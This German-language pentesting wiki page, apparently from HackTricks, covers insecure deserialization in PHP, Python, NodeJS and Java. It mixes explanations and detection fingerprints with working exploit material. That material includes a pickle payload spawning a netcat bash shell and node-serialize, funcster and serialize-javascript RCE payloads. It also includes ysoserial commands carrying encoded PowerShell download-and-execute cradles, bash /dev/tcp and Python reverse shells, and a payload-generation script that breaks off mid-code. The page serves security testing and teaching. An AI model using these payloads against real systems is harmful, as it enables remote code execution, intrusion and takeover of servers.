# Deserialization

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## Grundinformationen

**Serialization** wird als die Methode verstanden, ein Objekt in ein Format zu konvertieren, das gespeichert werden kann, mit der Absicht, das Objekt entweder zu speichern oder es als Teil eines Kommunikationsprozesses zu √ºbertragen. Diese Technik wird h√§ufig eingesetzt, um sicherzustellen, dass das Objekt zu einem sp√§teren Zeitpunkt rekonstruiert werden kann, wobei seine Struktur und sein Zustand beibehalten werden.

**Deserialization** hingegen ist der Prozess, der der Serialisierung entgegenwirkt. Es beinhaltet das Entnehmen von Daten, die in einem bestimmten Format strukturiert sind, und deren Rekonstruktion zur√ºck in ein Objekt.

Deserialization kann gef√§hrlich sein, da sie potenziell **Angreifern erm√∂glicht, die serialisierten Daten zu manipulieren, um sch√§dlichen Code auszuf√ºhren** oder unerwartetes Verhalten in der Anwendung w√§hrend des Rekonstruktionsprozesses des Objekts zu verursachen.

## PHP

In PHP werden spezifische magische Methoden w√§hrend der Serialisierungs- und Deserialisierungsprozesse verwendet:

* `__sleep`: Wird aufgerufen, wenn ein Objekt serialisiert wird. Diese Methode sollte ein Array der Namen aller Eigenschaften des Objekts zur√ºckgeben, die serialisiert werden sollen. Sie wird h√§ufig verwendet, um ausstehende Daten zu speichern oder √§hnliche Aufr√§umarbeiten durchzuf√ºhren.
* `__wakeup`: Wird aufgerufen, wenn ein Objekt deserialisiert wird. Sie wird verwendet, um alle Datenbankverbindungen, die w√§hrend der Serialisierung verloren gegangen sein k√∂nnten, wiederherzustellen und andere Reinitialisierungsaufgaben durchzuf√ºhren.
* `__unserialize`: Diese Methode wird anstelle von `__wakeup` (sofern vorhanden) aufgerufen, wenn ein Objekt deserialisiert wird. Sie bietet mehr Kontrolle √ºber den Deserialisierungsprozess im Vergleich zu `__wakeup`.
* `__destruct`: Diese Methode wird aufgerufen, wenn ein Objekt kurz davor steht, zerst√∂rt zu werden, oder wenn das Skript endet. Sie wird typischerweise f√ºr Aufr√§umarbeiten verwendet, wie das Schlie√üen von Datei-Handles oder Datenbankverbindungen.
* `__toString`: Diese Methode erm√∂glicht es, ein Objekt als String zu behandeln. Sie kann verwendet werden, um eine Datei zu lesen oder andere Aufgaben basierend auf den darin enthaltenen Funktionsaufrufen auszuf√ºhren, wodurch eine textuelle Darstellung des Objekts bereitgestellt wird.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Wenn Sie sich die Ergebnisse ansehen, k√∂nnen Sie sehen, dass die Funktionen **`__wakeup`** und **`__destruct`** aufgerufen werden, wenn das Objekt deserialisiert wird. Beachten Sie, dass in mehreren Tutorials zu finden ist, dass die Funktion **`__toString`** aufgerufen wird, wenn versucht wird, ein Attribut auszugeben, aber anscheinend **passiert das nicht mehr**.

{% hint style="warning" %}
Die Methode **`__unserialize(array $data)`** wird **anstatt von `__wakeup()`** aufgerufen, wenn sie in der Klasse implementiert ist. Sie erm√∂glicht es Ihnen, das Objekt zu deserialisieren, indem Sie die serialisierten Daten als Array bereitstellen. Sie k√∂nnen diese Methode verwenden, um Eigenschaften zu deserialisieren und alle erforderlichen Aufgaben bei der Deserialisierung auszuf√ºhren.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Sie k√∂nnen ein erkl√§rtes **PHP-Beispiel hier** lesen: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), hier [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) oder hier [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload-Klassen

Sie k√∂nnten die PHP-Autoload-Funktionalit√§t missbrauchen, um beliebige PHP-Dateien und mehr zu laden:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serialisierung von Referenzwerten

Wenn Sie aus irgendeinem Grund einen Wert als **Referenz zu einem anderen serialisierten Wert** serialisieren m√∂chten, k√∂nnen Sie:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial f√ºr PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) kann Ihnen helfen, Payloads zu generieren, um PHP-Deserialisierungen auszunutzen.\
Beachten Sie, dass Sie in mehreren F√§llen **keinen Weg finden werden, um eine Deserialisierung im Quellcode** der Anwendung auszunutzen, aber Sie m√∂glicherweise **den Code von externen PHP-Erweiterungen ausnutzen k√∂nnen.**\
Wenn m√∂glich, √ºberpr√ºfen Sie die `phpinfo()` des Servers und **suchen Sie im Internet** (und sogar in den **Gadgets** von **PHPGGC**) nach m√∂glichen Gadgets, die Sie ausnutzen k√∂nnten.

### phar:// Metadaten-Deserialisierung

Wenn Sie eine LFI gefunden haben, die nur die Datei liest und den PHP-Code darin nicht ausf√ºhrt, zum Beispiel mit Funktionen wie _**file\_get\_contents(), fopen(), file() oder file\_exists(), md5\_file(), filemtime() oder filesize()**_**.** Sie k√∂nnen versuchen, eine **Deserialisierung** auszunutzen, die auftritt, wenn eine **Datei** mit dem **phar**-Protokoll **gelesen** wird.\
F√ºr weitere Informationen lesen Sie den folgenden Beitrag:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Wenn das Objekt entpickelt wird, wird die Funktion _\_\_reduce\_\__ ausgef√ºhrt.\
Bei einer Ausnutzung k√∂nnte der Server einen Fehler zur√ºckgeben.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Bevor Sie die Bypass-Technik √ºberpr√ºfen, versuchen Sie `print(base64.b64encode(pickle.dumps(P(),2)))` zu verwenden, um ein Objekt zu generieren, das mit python2 kompatibel ist, wenn Sie python3 ausf√ºhren.

F√ºr weitere Informationen √ºber das Entkommen aus **pickle jails** siehe:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Die folgende Seite pr√§sentiert die Technik, um **eine unsichere Deserialisierung in YAMLs** Python-Bibliotheken zu **missbrauchen** und endet mit einem Tool, das verwendet werden kann, um RCE-Deserialisierungs-Payloads f√ºr **Pickle, PyYAML, jsonpickle und ruamel.yaml** zu generieren:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Class Pollution (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JS **hat keine "magischen" Funktionen** wie PHP oder Python, die nur zum Erstellen eines Objekts ausgef√ºhrt werden. Aber es gibt einige **Funktionen**, die **h√§ufig verwendet werden, auch ohne sie direkt aufzurufen**, wie **`toString`**, **`valueOf`**, **`toJSON`**.\
Wenn Sie eine Deserialisierung missbrauchen, k√∂nnen Sie **diese Funktionen kompromittieren, um anderen Code auszuf√ºhren** (potenziell durch Missbrauch von Prototyp-Verschmutzungen), k√∂nnten Sie beliebigen Code ausf√ºhren, wenn sie aufgerufen werden.

Eine weitere **"magische" M√∂glichkeit, eine Funktion aufzurufen**, ohne sie direkt aufzurufen, besteht darin, **ein Objekt zu kompromittieren, das von einer asynchronen Funktion** (Versprechen) **zur√ºckgegeben wird**. Denn wenn Sie **dieses R√ºckgabeobjekt** in ein anderes **Versprechen** mit einer **Eigenschaft** namens **"then" vom Typ Funktion** **transformieren**, wird es **ausgef√ºhrt**, nur weil es von einem anderen Versprechen zur√ºckgegeben wird. _Folgen Sie_ [_**diesem Link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _f√ºr weitere Informationen._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` und `prototype` Verschmutzung

Wenn Sie mehr √ºber diese Technik erfahren m√∂chten, **sehen Sie sich das folgende Tutorial an**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Diese Bibliothek erm√∂glicht es, Funktionen zu serialisieren. Beispiel:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
Das **serialisierte Objekt** wird wie folgt aussehen:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Sie k√∂nnen im Beispiel sehen, dass, wenn eine Funktion serialisiert wird, das `_$$ND_FUNC$$_`-Flag an das serialisierte Objekt angeh√§ngt wird.

Innerhalb der Datei `node-serialize/lib/serialize.js` finden Sie dasselbe Flag und wie der Code es verwendet.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Wie Sie im letzten Codeabschnitt sehen k√∂nnen, **wenn das Flag gefunden wird**, wird `eval` verwendet, um die Funktion zu deserialisieren, also wird im Grunde **Benutzereingabe innerhalb der `eval`-Funktion verwendet**.

Allerdings **f√ºhrt das blo√üe Serialisieren** einer Funktion **nicht zur Ausf√ºhrung**, da es notwendig w√§re, dass ein Teil des Codes **`y.rce` aufruft** in unserem Beispiel und das ist h√∂chst **unwahrscheinlich**.\
Dennoch k√∂nnten Sie einfach das **serialisierte Objekt modifizieren**, **indem Sie einige Klammern hinzuf√ºgen**, um die serialisierte Funktion automatisch auszuf√ºhren, wenn das Objekt deserialisiert wird.\
Im n√§chsten Codeabschnitt **beachten Sie die letzte Klammer** und wie die `unserialize`-Funktion den Code automatisch ausf√ºhren wird:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Wie zuvor angegeben, wird diese Bibliothek den Code nach `_$$ND_FUNC$$_` abrufen und ihn **ausf√ºhren** mit `eval`. Daher k√∂nnen Sie, um **Code automatisch auszuf√ºhren**, den Teil zur **Funktions Erstellung** und die letzte Klammer l√∂schen und **einfach eine JS-Oneliner ausf√ºhren** wie im folgenden Beispiel:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Sie k√∂nnen [**hier weitere Informationen**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) √ºber die Ausnutzung dieser Schwachstelle finden.

### [funcster](https://www.npmjs.com/package/funcster)

Ein bemerkenswerter Aspekt von **funcster** ist die Unzug√§nglichkeit von **standardm√§√üigen eingebauten Objekten**; sie fallen au√üerhalb des zug√§nglichen Bereichs. Diese Einschr√§nkung verhindert die Ausf√ºhrung von Code, der versucht, Methoden auf eingebauten Objekten aufzurufen, was zu Ausnahmen wie `"ReferenceError: console is not defined"` f√ºhrt, wenn Befehle wie `console.log()` oder `require(something)` verwendet werden.

Trotz dieser Einschr√§nkung ist die Wiederherstellung des vollst√§ndigen Zugriffs auf den globalen Kontext, einschlie√ülich aller standardm√§√üigen eingebauten Objekte, durch einen bestimmten Ansatz m√∂glich. Durch die direkte Nutzung des globalen Kontexts kann man diese Einschr√§nkung umgehen. Zum Beispiel kann der Zugriff mit dem folgenden Snippet wiederhergestellt werden:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**F√ºr**[ **weitere Informationen lesen Sie diese Quelle**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Das **serialize-javascript**-Paket ist ausschlie√ülich f√ºr Serialisierungszwecke konzipiert und verf√ºgt √ºber keine integrierten Deserialisierungsfunktionen. Die Benutzer sind daf√ºr verantwortlich, ihre eigene Methode zur Deserialisierung zu implementieren. Eine direkte Verwendung von `eval` wird im offiziellen Beispiel zur Deserialisierung von serialisierten Daten vorgeschlagen:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Wenn diese Funktion verwendet wird, um Objekte zu deserialisieren, k√∂nnen Sie **es leicht ausnutzen**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**F√ºr**[ **weitere Informationen lesen Sie diese Quelle**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo-Bibliothek

In den folgenden Seiten finden Sie Informationen dar√ºber, wie Sie diese Bibliothek missbrauchen k√∂nnen, um beliebige Befehle auszuf√ºhren:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

In Java werden **Deserialisierungs-Callbacks w√§hrend des Deserialisierungsprozesses ausgef√ºhrt**. Diese Ausf√ºhrung kann von Angreifern ausgenutzt werden, die b√∂sartige Payloads erstellen, die diese Callbacks ausl√∂sen, was zu potenziellen sch√§dlichen Aktionen f√ºhren kann.

### Fingerabdr√ºcke

#### White Box

Um potenzielle Serialisierungsanf√§lligkeiten im Code zu identifizieren, suchen Sie nach:

* Klassen, die das `Serializable`-Interface implementieren.
* Verwendung von `java.io.ObjectInputStream`, `readObject`, `readUnshared`-Funktionen.

Achten Sie besonders auf:

* `XMLDecoder`, der mit von externen Benutzern definierten Parametern verwendet wird.
* `XStream`'s `fromXML`-Methode, insbesondere wenn die XStream-Version kleiner oder gleich 1.46 ist, da sie anf√§llig f√ºr Serialisierungsprobleme ist.
* `ObjectInputStream` in Verbindung mit der `readObject`-Methode.
* Implementierung von Methoden wie `readObject`, `readObjectNodData`, `readResolve` oder `readExternal`.
* `ObjectInputStream.readUnshared`.
* Allgemeine Verwendung von `Serializable`.

#### Black Box

F√ºr Black-Box-Tests suchen Sie nach spezifischen **Signaturen oder "Magic Bytes"**, die java-serialisierte Objekte kennzeichnen (stammend von `ObjectInputStream`):

* Hexadezimales Muster: `AC ED 00 05`.
* Base64-Muster: `rO0`.
* HTTP-Antwortheader mit `Content-type`, der auf `application/x-java-serialized-object` gesetzt ist.
* Hexadezimales Muster, das auf eine vorherige Kompression hinweist: `1F 8B 08 00`.
* Base64-Muster, das auf eine vorherige Kompression hinweist: `H4sIA`.
* Webdateien mit der Erweiterung `.faces` und dem Parameter `faces.ViewState`. Das Entdecken dieser Muster in einer Webanwendung sollte eine Untersuchung nach sich ziehen, wie im [Beitrag √ºber Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md) beschrieben.
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### √úberpr√ºfen, ob verwundbar

Wenn Sie **lernen m√∂chten, wie ein Java Deserialized Exploit funktioniert**, sollten Sie sich [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md) und [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md) ansehen.

#### White Box Test

Sie k√∂nnen √ºberpr√ºfen, ob eine Anwendung mit bekannten Schwachstellen installiert ist.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Sie k√∂nnten versuchen, **alle Bibliotheken zu √ºberpr√ºfen**, von denen bekannt ist, dass sie anf√§llig sind und f√ºr die [**Ysoserial**](https://github.com/frohoff/ysoserial) einen Exploit bereitstellen kann. Oder Sie k√∂nnten die auf [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json) angegebenen Bibliotheken √ºberpr√ºfen.\
Sie k√∂nnten auch [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) verwenden, um nach m√∂glichen Gadget-Ketten zu suchen, die ausgenutzt werden k√∂nnen.\
Beim Ausf√ºhren von **gadgetinspector** (nach dem Bauen) k√ºmmern Sie sich nicht um die vielen Warnungen/Fehler, die es durchl√§uft, und lassen Sie es fertigstellen. Es wird alle Ergebnisse unter _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ schreiben. Bitte beachten Sie, dass **gadgetinspector keinen Exploit erstellt und m√∂glicherweise falsche Positivmeldungen anzeigt**.

#### Black Box Test

Mit der Burp-Erweiterung [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) k√∂nnen Sie **identifizieren, welche Bibliotheken verf√ºgbar sind** (und sogar die Versionen). Mit diesen Informationen k√∂nnte es **einfacher sein, eine Payload auszuw√§hlen**, um die Schwachstelle auszunutzen.\
[**Lesen Sie dies, um mehr √ºber GadgetProbe zu erfahren**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe konzentriert sich auf **`ObjectInputStream`-Deserialisierungen**.

Mit der Burp-Erweiterung [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) k√∂nnen Sie **anf√§llige Bibliotheken** identifizieren, die mit ysoserial ausgenutzt werden k√∂nnen, und sie **ausnutzen**.\
[**Lesen Sie dies, um mehr √ºber den Java Deserialization Scanner zu erfahren.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner konzentriert sich auf **`ObjectInputStream`**-Deserialisierungen.

Sie k√∂nnen auch [**Freddy**](https://github.com/nccgroup/freddy) verwenden, um **Deserialisierungs**-Schwachstellen in **Burp** zu **erkennen**. Dieses Plugin erkennt **nicht nur `ObjectInputStream`**-bezogene Schwachstellen, sondern **auch** Schwachstellen von **Json**- und **Yml**-Deserialisierungsbibliotheken. Im aktiven Modus versucht es, diese mit Sleep- oder DNS-Payloads zu best√§tigen.\
[**Hier finden Sie weitere Informationen √ºber Freddy.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

Es geht nicht nur darum zu √ºberpr√ºfen, ob eine anf√§llige Bibliothek vom Server verwendet wird. Manchmal k√∂nnten Sie in der Lage sein, **die Daten im serialisierten Objekt zu √§ndern und einige √úberpr√ºfungen zu umgehen** (vielleicht erhalten Sie Administratorrechte in einer Webanwendung).\
Wenn Sie ein in Java serialisiertes Objekt finden, das an eine Webanwendung gesendet wird, **k√∂nnen Sie** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **verwenden, um das serialisierte Objekt in einem menschenlesbaren Format auszugeben**. Zu wissen, welche Daten Sie senden, w√ºrde es einfacher machen, sie zu √§ndern und einige √úberpr√ºfungen zu umgehen.

### **Exploit**

#### **ysoserial**

Das Hauptwerkzeug zum Ausnutzen von Java-Deserialisierungen ist [**ysoserial**](https://github.com/frohoff/ysoserial) ([**hier herunterladen**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Sie k√∂nnen auch in Betracht ziehen, [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) zu verwenden, das es Ihnen erm√∂glicht, komplexe Befehle (zum Beispiel mit Pipes) zu verwenden.\
Beachten Sie, dass dieses Tool **fokussiert** ist auf das Ausnutzen von **`ObjectInputStream`**.\
Ich w√ºrde **beginnen, die "URLDNS"**-Payload **vor einer RCE**-Payload zu verwenden, um zu testen, ob die Injektion m√∂glich ist. Beachten Sie jedoch, dass die "URLDNS"-Payload m√∂glicherweise nicht funktioniert, aber eine andere RCE-Payload m√∂glicherweise funktioniert.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Wenn Sie eine Payload f√ºr **java.lang.Runtime.exec()** erstellen, **k√∂nnen Sie keine Sonderzeichen** wie ">" oder "|" verwenden, um die Ausgabe einer Ausf√ºhrung umzuleiten, "$()" um Befehle auszuf√ºhren oder sogar **Argumente** an einen Befehl zu √ºbergeben, die durch **Leerzeichen** getrennt sind (Sie k√∂nnen `echo -n "hello world"` tun, aber Sie k√∂nnen nicht `python2 -c 'print "Hello world"'` tun). Um die Payload korrekt zu codieren, k√∂nnten Sie [diese Webseite](http://www.jackson-t.ca/runtime-exec-payloads.html) verwenden.

F√ºhlen Sie sich frei, das n√§chste Skript zu verwenden, um **alle m√∂glichen Codeausf√ºhrungs-**Payloads f√ºr Windows und Linux zu erstellen und sie dann auf der verwundbaren Webseite zu testen:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
